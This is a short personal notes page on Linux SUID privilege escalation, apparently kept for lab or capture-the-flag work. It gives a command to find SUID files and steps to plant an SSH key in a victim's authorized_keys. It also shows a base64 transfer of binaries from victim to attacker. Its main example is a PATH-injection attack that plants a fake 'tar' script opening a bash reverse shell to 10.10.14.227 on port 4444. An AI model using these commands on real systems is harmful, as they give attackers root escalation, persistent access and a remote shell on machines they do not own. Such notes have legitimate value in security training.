This file were serve as a notes page for niche SUID abuse notes I stumble upon.

Reveal SUIDs
```
find / -perm -u=s -type f 2>/dev/null
```
Always check [GTFOBins](https://gtfobins.github.io/)


NOTE: Some SUIDs will only properly work with certain shell types. We can usually improve a shell we have w/ [[SSH Keygen]]
```
ssh-keygen -t <type> -f <output_name>

chmod 400 <private_key>

echo '<public_key_contents>' > /home/<user>/.ssh/authorized_keys

ssh -i <key> <user>@<ip_address>
```

Fire SUID


#### Read Contents of SUID

If SUID is a script, we can usually just cat it to reveal what it is doing

If it is a binary, we can transfer it back and run strings on it.
```
# On Victim
	base64 /bin/<SUID>

# On Attacker
	echo '<base64_data>' | base64 -d > <file>
	strings <file>
```

#### Path Injection
See [[Path Injection]]
Some linux scripts/binaries can be exploited by abusing paths.

If a command is performed within a script/binary without specifying an absolute path, we can create a file with the same name, and add the directory of the malicious duplicate file to the beginning of PATH env.

Path Injection example (tar)
```
cd /tmp/
vi tar

	#!/bin/bash
	/bin/bash -i >& /dev/tcp/10.10.14.227/4444 0>&1

chmod +x tar
export PATH=$(pwd):$PATH
echo $PATH
```
when the binary is run next and tar is run, it will run our malicious "tar" script instead of the real binary, and we catch a reverse shell.

NOTE: depending on the shell, we might be about to have the script just run "bash" , no rev-shell one-liner required
